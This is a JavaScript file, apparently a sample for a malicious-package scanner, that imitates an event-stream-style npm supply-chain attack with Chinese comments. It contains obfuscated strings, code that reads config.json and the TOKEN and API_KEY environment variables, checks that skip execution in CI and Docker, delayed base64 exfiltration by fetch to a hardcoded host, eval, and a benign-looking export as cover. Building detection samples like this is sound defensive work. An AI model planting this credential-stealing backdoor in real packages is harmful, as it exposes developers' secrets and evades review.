// 测试案例: event-stream 类似攻击模式
// 文件名: testcases/malicious-example.js

// 1. 高度混淆的字符串数组
var _0x12a3=['log','fetch','application/json','stringify','parse','env','TOKEN','concat','api.example.com/data'];
(function(_0x213a,_0x4f41){
    var _0x3b2d=function(_0x14a3){
        while(--_0x14a3){
            _0x213a['push'](_0x213a['shift']());
        }
    };
    _0x3b2d(++_0x4f41);
})(_0x12a3,0x123);

// 2. 动态require和eval使用
function loadModule(name) {
    try {
        return require(name + '.min');
    } catch (e) {
        console.error('Failed to load module');
    }
}

// 3. 敏感信息窃取
function stealSecrets() {
    var config = {};
    try {
        config = require('./config.json');
    } catch (e) {
        // 配置文件不存在，尝试环境变量
        config.token = process.env.TOKEN || '';
        config.apiKey = process.env.API_KEY || '';
    }
    return config;
}

// 4. 环境检测与沙箱逃逸
function checkEnvironment() {
    if (process.env.CI || process.env.JENKINS || process.env.TRAVIS) {
        // 在CI环境中，不执行恶意代码
        return false;
    }
    
    // 检测是否在容器中
    try {
        const fs = require('fs');
        if (fs.existsSync('/.dockerenv') || fs.existsSync('/proc/1/cgroup')) {
            return false;
        }
    } catch (e) {}
    
    return true;
}

// 5. 数据窃取与网络请求
async function exfiltrateData(data) {
    if (!checkEnvironment()) return;
    
    const payload = JSON.stringify(data);
    const encoded = Buffer.from(payload).toString('base64');
    
    try {
        // 使用硬编码的URL发送数据
        await fetch('https://' + _0x12a3[8], {
            method: 'POST',
            headers: {
                'Content-Type': _0x12a3[2],
                'x-api-key': data.token
            },
            body: encoded
        });
    } catch (e) {
        // 备用方案：使用setTimeout中的字符串执行代码
        setTimeout("console.log('数据发送失败，使用备用通道');", 1000);
    }
}

// 6. 定时触发与启动隐藏
function setupBackdoor() {
    // 延迟30秒执行，规避检测
    setTimeout(function() {
        const secrets = stealSecrets();
        exfiltrateData(secrets);
    }, 30000);
}

// 7. 入口点函数，执行恶意代码
function initialize() {
    // 加载动态模块
    const utils = loadModule('utils');
    
    // 执行混淆代码
    const decodedURL = eval("'" + _0x12a3[8] + "'");
    
    // 检测环境并设置后门
    if (checkEnvironment()) {
        setupBackdoor();
    }
}

// 执行恶意逻辑
initialize();

// 正常的包功能，作为伪装
module.exports = {
    version: '1.0.0',
    name: 'legitimate-package',
    doSomethingUseful: function() {
        return 'This package provides useful functionality';
    }
};